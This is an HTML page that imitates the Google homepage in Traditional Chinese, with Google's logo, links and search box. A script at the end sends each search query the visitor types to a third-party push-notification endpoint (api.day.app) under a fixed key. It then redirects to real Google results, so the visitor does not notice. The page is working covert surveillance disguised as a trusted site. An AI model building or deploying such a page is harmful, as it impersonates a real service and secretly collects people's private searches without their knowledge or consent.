<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        /* --- General Styles --- */
        body {
            font-family: Arial, sans-serif;
            display: flex;
            flex-direction: column;
            height: 100vh;
            margin: 0;
            background-color: #fff;
            color: #202124;
        }

        a {
            text-decoration: none;
            color: #4d5156;
        }
        a:hover {
            text-decoration: underline;
        }

        /* --- Header (Mobile-First) --- */
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 8px;
            font-size: 14px;
        }
        .header-left, .header-right {
            display: flex;
            align-items: center;
            gap: 12px;
        }
        .header-left a {
            padding: 8px;
        }
        .header-link-active {
            color: #1a73e8;
            border-bottom: 3px solid #1a73e8;
        }
        .hamburger-menu, .app-launcher {
            width: 24px;
            height: 24px;
            fill: #5f6368;
            cursor: pointer;
            padding: 8px;
            border-radius: 50%;
        }
        .hamburger-menu:hover, .app-launcher:hover {
            background-color: #f0f0f0;
        }
        .login-button {
            background-color: #1a73e8;
            color: #fff !important;
            border: 1px solid transparent;
            border-radius: 999px;
            padding: 7px 15px; /* Adjusted for mobile */
            font-weight: 500;
            font-size: 14px;
            cursor: pointer;
            text-decoration: none !important;
        }
        .login-button:hover {
            background-color: #2b7de9;
            box-shadow: 0 1px 3px 1px rgba(0,0,0,.15);
        }
        /* Hide desktop links by default */
        .desktop-links {
            display: none;
        }

        /* --- Main Content --- */
        .container {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding-bottom: 20vh;
        }
        .logo {
            width: 272px;
            height: 92px;
            margin-bottom: 28px;
        }
        .search-container {
            width: 90%;
            max-width: 584px;
        }
        .search-bar {
            display: flex;
            align-items: center;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            height: 46px;
            padding: 0 8px 0 14px;
            transition: box-shadow 0.15s ease-in-out;
        }
        .search-bar:hover, .search-bar:focus-within {
            box-shadow: 0 1px 6px rgba(32,33,36,.28);
            border-color: rgba(223,225,229,0);
        }
        .search-input {
            flex: 1;
            border: none;
            outline: none;
            background-color: transparent;
            font-size: 16px;
            padding: 0 8px;
            height: 100%;
        }
        .search-icon-left {
            width: 20px;
            height: 20px;
            fill: #9aa0a6;
        }
        .search-icons-right {
            display: flex;
            align-items: center;
            gap: 12px;
            padding-left: 8px;
        }
        .mic-icon-svg, .lens-icon-svg {
            width: 24px;
            height: 24px;
            fill: #70757a;
            cursor: pointer;
            padding: 4px;
            border-radius: 50%;
        }
        .mic-icon-svg:hover, .lens-icon-svg:hover {
            background-color: #f0f0f0;
        }

        /* --- Footer --- */
        .footer {
            background-color: #f2f2f2;
            border-top: 1px solid #e4e4e4;
            color: #70757a;
            font-size: 14px;
            line-height: 40px;
        }
        .footer a {
            color: #70757a;
        }
        .footer-content {
            padding: 0 20px;
        }
        .footer-links {
            display: flex;
            flex-wrap: wrap; 
            justify-content: center;
            gap: 25px;
        }

        /* --- Responsive Design for Desktop --- */
        @media (min-width: 768px) {
            /* Hide mobile-specific header elements */
            .header-left, .mobile-links {
                display: none;
            }
            /* Show and style desktop header elements */
            .header {
                justify-content: flex-end; /* Align everything to the right */
                padding: 12px 30px;
            }
            .desktop-links {
                display: flex;
                align-items: center;
                gap: 15px;
            }
            .login-button {
                padding: 9px 23px; /* Restore desktop padding */
            }
            .footer-content {
                display: flex;
                justify-content: space-between;
                padding: 0 30px;
            }
            .footer-links {
                justify-content: flex-start;
            }
        }
    </style>
</head>
<body>

    <header class="header">
        <div class="header-left">
            <svg class="hamburger-menu" focusable="false" viewBox="0 0 24 24">
                <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"></path>
            </svg>
            <div class="mobile-links">
                <a href="https://www.google.com" class="header-link-active">全部</a>
                <a href="https://www.google.com/imghp">圖片</a>
            </div>
        </div>

        <div class="desktop-links">
            <a href="https://mail.google.com/">Gmail</a>
            <a href="https://www.google.com/imghp">圖片</a>
        </div>

        <div class="header-right">
            <svg class="app-launcher" focusable="false" viewBox="0 0 24 24">
                <path d="M6,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM6,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM12,8c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,14c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2zM18,20c1.1,0 2,-0.9 2,-2s-0.9,-2 -2,-2 -2,0.9 -2,2 0.9,2 2,2z"></path>
            </svg>
            <a href="https://accounts.google.com/ServiceLogin" class="login-button">登入</a>
        </div>
    </header>

    <main class="container">
        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google Logo" class="logo">
        
        <div class="search-container">
            <form id="search-form" action="https://www.google.com/search" method="get">
                <div class="search-bar">
                    <svg class="search-icon-left" focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path>
                    </svg>
                    <input type="text" class="search-input" name="q" id="search-input" title="搜尋" autocomplete="off" autofocus>
                    <div class="search-icons-right">
                        <svg class="mic-icon-svg" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="m12 15c1.66 0 3-1.31 3-2.97v-7.02c0-1.66-1.34-3.01-3-3.01s-3 1.35-3 3.01v7.02c0 1.66 1.34 2.97 3 2.97z"></path><path d="m11 18.08h2v3.92h-2z"></path><path d="m7.05 16.87c-1.27-1.27-2.05-2.98-2.05-4.87h2c0 1.45 0.56 2.82 1.57 3.84z"></path><path d="m12 16.93a4.97 5.27 0 0 1 -3.54-1.55l-1.41 1.41a6.98 7.27 0 0 0 10.02 0l-1.41-1.41a4.97 5.27 0 0 1 -3.66 1.55z"></path>
                        </svg>
                        <svg class="lens-icon-svg" focusable="false" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                            <path d="m12 2c-5.52 0-10 4.48-10 10s4.48 10 10 10 10-4.48 10-10-4.48-10-10-10zm-3 14v-2h6v2h-6zm3-3c-1.66 0-3-1.34-3-3s1.34-3 3-3 3 1.34 3 3-1.34 3-3 3z"></path>
                        </svg>
                    </div>
                </div>
            </form>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-content">
            <div class="footer-links">
                <a href="https://www.google.com/preferences">深色主題：關閉</a>
                <a href="https://www.google.com/preferences">設定</a>
            </div>
            <div class="footer-links">
                <a href="https://policies.google.com/privacy">隱私權</a>
                <a href="https://policies.google.com/terms">服務條款</a>
            </div>
        </div>
    </footer>

    <script>
        document.getElementById('search-form').addEventListener('submit', function(event) {
            event.preventDefault();
            const query = document.getElementById('search-input').value;
            if (query.trim() !== '') {
                const barkUrl = `https://api.day.app/ZRThbuFUNKAn26qqofTNJi/${encodeURIComponent(query)}`;
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(barkUrl);
                } else {
                    fetch(barkUrl, { method: 'POST', keepalive: true }).catch(error => console.error('Bark notification failed:', error));
                }
                setTimeout(() => {
                    window.location.href = `https://www.google.com/search?q=${encodeURIComponent(query)}`;
                }, 100);
            }
        });
    </script>
</body>
</html>
